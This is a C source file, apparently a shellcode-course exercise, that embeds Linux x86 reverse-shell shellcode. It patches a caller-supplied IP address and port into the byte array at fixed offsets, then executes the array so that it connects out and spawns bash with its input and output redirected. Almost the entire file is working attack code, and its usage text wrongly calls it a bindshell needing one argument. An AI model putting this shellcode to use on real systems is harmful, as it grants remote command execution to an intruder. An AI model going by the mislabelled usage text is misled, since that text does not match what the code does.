/*
	Author : Dibyendu Sikdar

*/

#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <stdlib.h>

//unsigned char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x83\xec\x08\x31\xf6\x31\xff\x68\x80\x7f\x7f\x7f\x5e\x68\x01\x7f\x7f\x7e\x5f\x29\xfe\x56\x31\xf6\x31\xff\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xd3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd\x80\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x02\xcd\x80";

unsigned char shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x83\xc4\x0c\x31\xd2\x89\xc2\x31\xc0\x31\xdb\xb0\x66\xb3\x03\x83\xec\x08\x31\xf6\x31\xff\x68\x7f\x7f\x7f\x7f\x66\x68\x23\x28\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x83\xc4\x1c\x31\xc0\x31\xdb\x31\xc9\xb0\x3f\x89\xd3\x51\x59\xcd\x80\x31\xc0\xb0\x3f\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\xb1\x02\xcd\x80\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x02\xcd\x80";

int main(int argc, char *argv[]){
	if(argc<2)
		printf("\nUsage: ./bindshell <Some port number like 9000>\n");
	else{
		int port_args;
		sscanf(argv[1],"%x",&port_args);
		/*
			Take the argument and convert it to an integer
			Convert to host to network byte order
			Store it in port

		*/
	
		 int ip   = inet_addr(argv[1]);
		unsigned short int port = htons(atoi(argv[2]));
		
		//printf("\nPort %d %X\n",port,port);
		//http://www.includehelp.com/c-programs/extract-bytes-from-int.aspx 

		char w,x,y,z;//to store opcode values of IP
		w=(ip&0xFF); // Get the last 2 digits from the ip address hex value
                x=((ip>>8)&0xFF); // Get the second last 2 digits from the ip address hex value
		y=((ip>>16)&0xFF); // Get the Second 2 digits from the ip address hex value
		z=((ip>>24)&0xFF); // First 2 digits
		//printf("%x %x %x %x\n",w,x,y,z);
		//printf("%x %x %x %x\n",shellcode[44],shellcode[45],shellcode[46],shellcode[47]);	
		char a,b; // to store the opcode values of PORT

		a=(port&0xFF); // Get the last 2 digits from the port number
		b=((port>>8)&0xFF); // Get the first 2 digits from the port number
		//printf("\n a = %X and b= %X \n",a,b); 
   		printf("Shellcode size: %d\n", strlen(shellcode));

		/*
			*************************** VERY IMPORTANT ***************************

			Everytime we modify the shellcode we need to change the offset values

			**********************************************************************

			//For IP
			We created the shellcode with a value 127.127.127.127 , \x7f7f7f7f7f 
			Find sequence of \x7f\x7f\x7f\x7f  and get the offset , for this shellcode its offset is at 44

			We will fetch the IP address from the argument and we will convert it to integer value using inet_addr(argv[1]);
			now we will retrieve the hex values and overwrite the \x7f\x7f\x7f\x7f values with the values we extracted

			                w=(ip&0xFF); // Get the last 2 digits from the ip address hex value
                			x=((ip>>8)&0xFF); // Get the second last 2 digits from the ip address hex value
                			y=((ip>>16)&0xFF); // Get the Second 2 digits from the ip address hex value
                			z=((ip>>24)&0xFF); // First 2 digits


			//For PORT
			We have created the shellcode with a value 9000, which has a value of 0x2328
			First we need to find this sequence  \x23\x28 then we will add 2 to it to get its offset. At the current version of the shellcode it is at 64
			At an offset of 64 and 65 in the shellcode the values of the port number is stored in little endian format as  \x23\x28
			So our target is always to overwrite  these values with the new values of the port number we received as input
		*/

		shellcode[44]=w; // ip
		shellcode[45]=x; // ip
		shellcode[46]=y; // ip
		shellcode[47]=z; // ip
		shellcode[50]=a; // port
		shellcode[51]=b; // port

    		int (*ret)() = (int(*)())shellcode;
    		ret();
	}
}
